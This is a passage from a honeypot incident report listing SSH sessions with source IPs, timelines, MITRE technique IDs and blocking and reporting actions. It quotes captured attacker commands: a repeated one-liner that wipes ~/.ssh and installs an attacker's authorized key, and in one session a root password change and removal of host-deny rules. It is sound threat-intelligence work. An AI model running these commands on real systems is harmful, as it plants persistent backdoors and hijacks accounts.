| `2026-04-25 09:42:59` | `cowrie.session.params` |
| `2026-04-25 09:42:59` | `cowrie.command.input` |
| `2026-04-25 09:42:59` | `cowrie.session.file_download` |
| `2026-04-25 09:42:59` | `cowrie.log.closed` |
| `2026-04-25 09:43:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc5424432551

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:43 |
| **Last Seen** | 2026-04-25 09:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:43:02` | `cowrie.session.connect` |
| `2026-04-25 09:43:02` | `cowrie.client.version` |
| `2026-04-25 09:43:02` | `cowrie.client.kex` |
| `2026-04-25 09:43:03` | `cowrie.login.success` |
| `2026-04-25 09:43:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf2d3df18d5a

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:43 |
| **Last Seen** | 2026-04-25 09:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:43:19` | `cowrie.session.connect` |
| `2026-04-25 09:43:19` | `cowrie.client.version` |
| `2026-04-25 09:43:19` | `cowrie.client.kex` |
| `2026-04-25 09:43:19` | `cowrie.login.success` |
| `2026-04-25 09:43:20` | `cowrie.session.params` |
| `2026-04-25 09:43:20` | `cowrie.command.input` |
| `2026-04-25 09:43:20` | `cowrie.command.failed` |
| `2026-04-25 09:43:20` | `cowrie.log.closed` |
| `2026-04-25 09:43:20` | `cowrie.session.params` |
| `2026-04-25 09:43:20` | `cowrie.command.input` |
| `2026-04-25 09:43:20` | `cowrie.session.file_download` |
| `2026-04-25 09:43:20` | `cowrie.log.closed` |
| `2026-04-25 09:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-175ba59b7e56

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-25 09:43 |
| **Last Seen** | 2026-04-25 09:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:43:22` | `cowrie.session.connect` |
| `2026-04-25 09:43:22` | `cowrie.client.version` |
| `2026-04-25 09:43:22` | `cowrie.client.kex` |
| `2026-04-25 09:43:23` | `cowrie.login.success` |
| `2026-04-25 09:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e53a4f8e47

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:50 |
| **Last Seen** | 2026-04-25 09:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:50:53` | `cowrie.session.connect` |
| `2026-04-25 09:50:53` | `cowrie.client.version` |
| `2026-04-25 09:50:53` | `cowrie.client.kex` |
| `2026-04-25 09:50:54` | `cowrie.login.success` |
| `2026-04-25 09:50:55` | `cowrie.session.params` |
| `2026-04-25 09:50:55` | `cowrie.command.input` |
| `2026-04-25 09:50:55` | `cowrie.command.failed` |
| `2026-04-25 09:50:55` | `cowrie.log.closed` |
| `2026-04-25 09:50:55` | `cowrie.session.params` |
| `2026-04-25 09:50:55` | `cowrie.command.input` |
| `2026-04-25 09:50:55` | `cowrie.session.file_download` |
| `2026-04-25 09:50:55` | `cowrie.log.closed` |
| `2026-04-25 09:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fea6d6f8a737

| Field | Detail |
|---|---|
| **Source IP** | `172.210.249[.]152` |
| **First Seen** | 2026-04-25 09:50 |
| **Last Seen** | 2026-04-25 09:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 09:50:58` | `cowrie.session.connect` |
| `2026-04-25 09:50:58` | `cowrie.client.version` |
| `2026-04-25 09:50:58` | `cowrie.client.kex` |
| `2026-04-25 09:50:59` | `cowrie.login.success` |
| `2026-04-25 09:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.249[.]152` to AbuseIPDB if not already reported
- [ ] Block `172.210.249[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0eb20191ca

| Field | Detail |
|---|---|
| **Source IP** | `187.210.77[.]100` |
| **First Seen** | 2026-04-25 10:01 |
| **Last Seen** | 2026-04-25 10:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:01:34` | `cowrie.session.connect` |
| `2026-04-25 10:01:34` | `cowrie.client.version` |
| `2026-04-25 10:01:34` | `cowrie.client.kex` |
| `2026-04-25 10:01:36` | `cowrie.login.success` |
| `2026-04-25 10:01:37` | `cowrie.session.params` |
| `2026-04-25 10:01:37` | `cowrie.command.input` |
| `2026-04-25 10:01:37` | `cowrie.command.failed` |
| `2026-04-25 10:01:37` | `cowrie.log.closed` |
| `2026-04-25 10:01:38` | `cowrie.session.params` |
| `2026-04-25 10:01:38` | `cowrie.command.input` |
| `2026-04-25 10:01:38` | `cowrie.session.file_download` |
| `2026-04-25 10:01:38` | `cowrie.log.closed` |
| `2026-04-25 10:01:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.210.77[.]100` to AbuseIPDB if not already reported
- [ ] Block `187.210.77[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66c7d8e1663c

| Field | Detail |
|---|---|
| **Source IP** | `187.210.77[.]100` |
| **First Seen** | 2026-04-25 10:01 |
| **Last Seen** | 2026-04-25 10:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:01:43` | `cowrie.session.connect` |
| `2026-04-25 10:01:43` | `cowrie.client.version` |
| `2026-04-25 10:01:43` | `cowrie.client.kex` |
| `2026-04-25 10:01:45` | `cowrie.login.success` |
| `2026-04-25 10:01:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.210.77[.]100` to AbuseIPDB if not already reported
- [ ] Block `187.210.77[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22aa643cc528

| Field | Detail |
|---|---|
| **Source IP** | `117.159.39[.]226` |
| **First Seen** | 2026-04-25 10:18 |
| **Last Seen** | 2026-04-25 10:18 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:tIy8vGuG1cHy"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:18:32` | `cowrie.session.connect` |
| `2026-04-25 10:18:32` | `cowrie.client.version` |
| `2026-04-25 10:18:33` | `cowrie.client.kex` |
| `2026-04-25 10:18:35` | `cowrie.login.success` |
| `2026-04-25 10:18:35` | `cowrie.session.params` |
| `2026-04-25 10:18:35` | `cowrie.command.input` |
| `2026-04-25 10:18:35` | `cowrie.command.failed` |
| `2026-04-25 10:18:35` | `cowrie.log.closed` |
| `2026-04-25 10:18:36` | `cowrie.session.params` |
| `2026-04-25 10:18:36` | `cowrie.command.input` |
| `2026-04-25 10:18:36` | `cowrie.session.file_download` |
| `2026-04-25 10:18:36` | `cowrie.log.closed` |
| `2026-04-25 10:18:48` | `cowrie.session.params` |
| `2026-04-25 10:18:48` | `cowrie.command.input` |
| `2026-04-25 10:18:48` | `cowrie.log.closed` |
| `2026-04-25 10:18:49` | `cowrie.session.params` |
| `2026-04-25 10:18:49` | `cowrie.command.input` |
| `2026-04-25 10:18:49` | `cowrie.log.closed` |
| `2026-04-25 10:18:49` | `cowrie.session.params` |
| `2026-04-25 10:18:49` | `cowrie.command.input` |
| `2026-04-25 10:18:50` | `cowrie.session.file_download` |
| `2026-04-25 10:18:50` | `cowrie.log.closed` |
| `2026-04-25 10:18:50` | `cowrie.session.params` |
| `2026-04-25 10:18:50` | `cowrie.command.input` |
| `2026-04-25 10:18:50` | `cowrie.log.closed` |
| `2026-04-25 10:18:51` | `cowrie.session.params` |
| `2026-04-25 10:18:51` | `cowrie.command.input` |
| `2026-04-25 10:18:51` | `cowrie.log.closed` |
| `2026-04-25 10:18:51` | `cowrie.session.params` |
| `2026-04-25 10:18:51` | `cowrie.command.input` |
| `2026-04-25 10:18:51` | `cowrie.command.input` |
| `2026-04-25 10:18:51` | `cowrie.log.closed` |
| `2026-04-25 10:18:52` | `cowrie.session.params` |
| `2026-04-25 10:18:52` | `cowrie.command.input` |
| `2026-04-25 10:18:52` | `cowrie.log.closed` |
| `2026-04-25 10:18:53` | `cowrie.session.params` |
| `2026-04-25 10:18:53` | `cowrie.command.input` |
| `2026-04-25 10:18:53` | `cowrie.log.closed` |
| `2026-04-25 10:18:53` | `cowrie.session.params` |
| `2026-04-25 10:18:53` | `cowrie.command.input` |
| `2026-04-25 10:18:53` | `cowrie.log.closed` |
| `2026-04-25 10:18:54` | `cowrie.session.params` |
| `2026-04-25 10:18:54` | `cowrie.command.input` |
| `2026-04-25 10:18:54` | `cowrie.log.closed` |
| `2026-04-25 10:18:54` | `cowrie.session.params` |
| `2026-04-25 10:18:54` | `cowrie.command.input` |
| `2026-04-25 10:18:55` | `cowrie.log.closed` |
| `2026-04-25 10:18:55` | `cowrie.session.params` |
| `2026-04-25 10:18:55` | `cowrie.command.input` |
| `2026-04-25 10:18:55` | `cowrie.log.closed` |
| `2026-04-25 10:18:56` | `cowrie.session.params` |
| `2026-04-25 10:18:56` | `cowrie.command.input` |
| `2026-04-25 10:18:56` | `cowrie.log.closed` |
| `2026-04-25 10:18:56` | `cowrie.session.params` |
| `2026-04-25 10:18:56` | `cowrie.command.input` |
| `2026-04-25 10:18:56` | `cowrie.log.closed` |
| `2026-04-25 10:18:57` | `cowrie.session.params` |
| `2026-04-25 10:18:57` | `cowrie.command.input` |
| `2026-04-25 10:18:57` | `cowrie.log.closed` |
| `2026-04-25 10:18:57` | `cowrie.session.params` |
| `2026-04-25 10:18:57` | `cowrie.command.input` |
| `2026-04-25 10:18:58` | `cowrie.log.closed` |
| `2026-04-25 10:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.159.39[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.159.39[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8737dfe6d14

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:19 |
| **Last Seen** | 2026-04-25 10:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:19:27` | `cowrie.session.connect` |
| `2026-04-25 10:19:27` | `cowrie.client.version` |
| `2026-04-25 10:19:27` | `cowrie.client.kex` |
| `2026-04-25 10:19:28` | `cowrie.login.success` |
| `2026-04-25 10:19:29` | `cowrie.session.params` |
| `2026-04-25 10:19:29` | `cowrie.command.input` |
| `2026-04-25 10:19:29` | `cowrie.command.failed` |
| `2026-04-25 10:19:29` | `cowrie.log.closed` |
| `2026-04-25 10:19:29` | `cowrie.session.params` |
| `2026-04-25 10:19:29` | `cowrie.command.input` |
| `2026-04-25 10:19:30` | `cowrie.session.file_download` |
| `2026-04-25 10:19:30` | `cowrie.log.closed` |
| `2026-04-25 10:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcbb0226c956

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:19 |
| **Last Seen** | 2026-04-25 10:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:19:32` | `cowrie.session.connect` |
| `2026-04-25 10:19:32` | `cowrie.client.version` |
| `2026-04-25 10:19:33` | `cowrie.client.kex` |
| `2026-04-25 10:19:34` | `cowrie.login.success` |
| `2026-04-25 10:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f0d40eeb1a5

| Field | Detail |
|---|---|
| **Source IP** | `117.159.39[.]226` |
| **First Seen** | 2026-04-25 10:20 |
| **Last Seen** | 2026-04-25 10:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:20:21` | `cowrie.session.connect` |
| `2026-04-25 10:20:21` | `cowrie.client.version` |
| `2026-04-25 10:20:22` | `cowrie.client.kex` |
| `2026-04-25 10:20:22` | `cowrie.login.success` |
| `2026-04-25 10:20:23` | `cowrie.session.params` |
| `2026-04-25 10:20:23` | `cowrie.command.input` |
| `2026-04-25 10:20:23` | `cowrie.command.failed` |
| `2026-04-25 10:20:23` | `cowrie.log.closed` |
| `2026-04-25 10:20:23` | `cowrie.session.params` |
| `2026-04-25 10:20:23` | `cowrie.command.input` |
| `2026-04-25 10:20:23` | `cowrie.session.file_download` |
| `2026-04-25 10:20:23` | `cowrie.log.closed` |
| `2026-04-25 10:20:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.159.39[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.159.39[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14da2eaf67ac

| Field | Detail |
|---|---|
| **Source IP** | `117.159.39[.]226` |
| **First Seen** | 2026-04-25 10:20 |
| **Last Seen** | 2026-04-25 10:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:20:26` | `cowrie.session.connect` |
| `2026-04-25 10:20:26` | `cowrie.client.version` |
| `2026-04-25 10:20:26` | `cowrie.client.kex` |
| `2026-04-25 10:20:27` | `cowrie.login.success` |
| `2026-04-25 10:20:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.159.39[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.159.39[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e90180350ba0

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:22 |
| **Last Seen** | 2026-04-25 10:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:22:50` | `cowrie.session.connect` |
| `2026-04-25 10:22:50` | `cowrie.client.version` |
| `2026-04-25 10:22:50` | `cowrie.client.kex` |
| `2026-04-25 10:22:51` | `cowrie.login.success` |
| `2026-04-25 10:22:51` | `cowrie.session.params` |
| `2026-04-25 10:22:51` | `cowrie.command.input` |
| `2026-04-25 10:22:51` | `cowrie.command.failed` |
| `2026-04-25 10:22:51` | `cowrie.log.closed` |
| `2026-04-25 10:22:52` | `cowrie.session.params` |
| `2026-04-25 10:22:52` | `cowrie.command.input` |
| `2026-04-25 10:22:52` | `cowrie.session.file_download` |
| `2026-04-25 10:22:52` | `cowrie.log.closed` |
| `2026-04-25 10:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7fb31ae75e7

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:22 |
| **Last Seen** | 2026-04-25 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:22:55` | `cowrie.session.connect` |
| `2026-04-25 10:22:55` | `cowrie.client.version` |
| `2026-04-25 10:22:55` | `cowrie.client.kex` |
| `2026-04-25 10:22:56` | `cowrie.login.success` |
| `2026-04-25 10:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a6825fc9960

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:24 |
| **Last Seen** | 2026-04-25 10:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
